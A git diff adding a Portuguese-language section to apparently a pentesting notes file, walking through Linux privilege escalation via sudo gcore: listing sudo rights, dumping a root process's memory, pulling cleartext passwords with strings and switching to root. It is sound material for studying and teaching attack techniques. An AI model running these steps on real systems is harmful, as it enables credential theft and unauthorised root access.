@@ -95,3 +95,69 @@ Descoberta de vulnerabilidade de execução de código remoto (RCE) no ExifTool,
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
+
+---
+
+## Sudo gcore
+
+### Passo 1: Verificar Permissões sudo
+Comece verificando se o usuário atual possui permissões para executar comandos com `sudo`.
+
+```
+sudo -l
+```
+
+> Procure por comandos que podem ser executados com privilégios elevados, especialmente aqueles que permitem gerar dumps de memória, como `/usr/bin/gcore`.
+
+### Passo 2: Identificar Processos de Interesse
+Liste todos os processos em execução para localizar algum que contenha informações sensíveis, como credenciais ou configurações confidenciais.
+
+```
+ps auxwww
+```
+
+> Identifique o PID de um processo interessante, como `/usr/bin/password-store`, que está sendo executado como root.
+
+
+### Passo 3: Gerar Dump de Memória com gcore
+Use `gcore` para criar um core dump do processo alvo. Substitua `<PID>` pelo PID do processo de interesse.
+
+```
+sudo /usr/bin/gcore <PID>
+```
+
+> Exemplo: `sudo /usr/bin/gcore 492`
+
+> Isso criará um arquivo `core.<PID>` no diretório atual, contendo uma cópia da memória do processo.
+
+### Passo 4: Analisar o Dump de Memória com strings
+Use o comando `strings` para analisar o core dump em busca de informações em texto claro (cleartext), como credenciais.
+
+```
+strings core.<PID>
+```
+
+> Exemplo: `strings core.492`
+
+> Procure por palavras como "password", "user", ou nomes de aplicativos que possam conter credenciais.
+
+### Passo 5: Usar Credenciais para Escalonar Privilégios
+Se encontrar credenciais para o usuário root, utilize-as para escalonar privilégios.
+
+```
+su root
+```
+
+> Insira a senha encontrada no core dump para obter acesso root.
+
+
+
+### Resumo do Processo
+
+1. **Verificar permissões sudo**: `sudo -l`
+2. **Identificar processos de interesse**: `ps auxwww`
+3. **Gerar dump com gcore**: `sudo /usr/bin/gcore <PID>`
+4. **Analisar o dump com strings**: `strings core.<PID>`
+5. **Escalonar privilégios**: `su root`
+
+---
